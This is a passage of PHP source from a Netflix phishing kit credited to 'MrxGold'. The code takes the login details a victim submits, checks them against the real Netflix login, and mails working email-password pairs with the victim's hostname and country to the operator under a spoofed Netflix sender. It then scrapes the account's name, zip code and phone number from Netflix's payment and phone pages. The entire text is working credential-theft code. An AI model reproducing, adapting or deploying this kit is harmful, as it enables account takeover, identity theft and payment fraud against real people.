...
$get_token=curl('https://www.netflix.com/login');$preg_token=preg_match_all("/name=\"authURL\" value=\"(.*?)\"/",$get_token,$arr_token);$test_true=curl('https://www.netflix.com/ma-fr/login','email='.rawurlencode($_POST['eml']).'&password='.rawurlencode($_POST['pss']).'&rememberMe=true&flow=websiteSignUp&mode=login&action=loginAction&withFields=email%2Cpassword%2CrememberMe%2CnextPage%2CshowPassword&authURL='.rawurlencode($arr_token[1][0]).'&nextPage=&showPassword=: undefined',false,false);if(strpos($test_true,'<b>Mot de passe incorrect.</b>')){exit('error');}else{$_SESSION['computer']=gethostbyaddr($_SERVER['REMOTE_ADDR'])." | {$_POST['screen']}";		
 ...
 ⚜️ NETFLIX LOGIN ⚜️
 ⚜️ NETFLIX LOGIN BY 🚦☠️ MrxGold ☠️🚦⚜️ \n
📩Email 📩 : {$_POST['eml']}
🔑 Password 🔑 : {$_POST['pss']} \n
...
$subject=" 🔑 NETFLIX LOGIN 🔑 [".$_POST['eml']."] From [".$_SESSION['ip_countryName']."] ";
$headers="From: ⚜️ Netflix ⚜️ <newlogin@libia.colombiahosting.com.com>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/html; charset=UTF-8\r\n";if($sendtoemail=="yes"){foreach(explode(",",$yours)as $your){@mail($your,$subject,$msg,$headers);
}
}
$PaymentPage=curl('https://www.netflix.com/signup/editcredit');
$firstname=preg_match_all("/id=\"id_firstName\" value=\"(.*?)\"/i",$PaymentPage,$CCFname);if($CCFname[1][0]==NULL){$PaymentPage=curl('https://www.netflix.com/simplemember/editcredit');
}
$get_phonenumber=curl('https://www.netflix.com/phonenumber');
$Phone=preg_match_all("/id=\"phone\" value=\"(.*?)\"/i",$get_phonenumber,$PhoneNumber);
if($PhoneNumber[1][0]==NULL){$_SESSION['phone']='';
}
else{$_SESSION['phone']=str_replace('\x2B','+',$PhoneNumber[1][0]);
}
...
if($CCFname[1][0]==NULL){$_SESSION['firstname']='';}else{$_SESSION['firstname']=$CCFname[1][0];
}
$lastname=preg_match_all("/id=\"id_lastName\" value=\"(.*?)\"/i",$PaymentPage,$CCLname);
if($CCLname[1][0]==NULL){$_SESSION['lastname']='';
}
else{$_SESSION['lastname']=$CCLname[1][0];
}
$gzip=preg_match_all("/id=\"id_creditZipcode\" value=\"(.*?)\"/i",$PaymentPage,$zipC);
if($zipC[1][0]==NULL){$_SESSION['zipCode']='';}else{$_SESSION['zipCode']=$zipC[1][0];
}
exit('done');
}
}
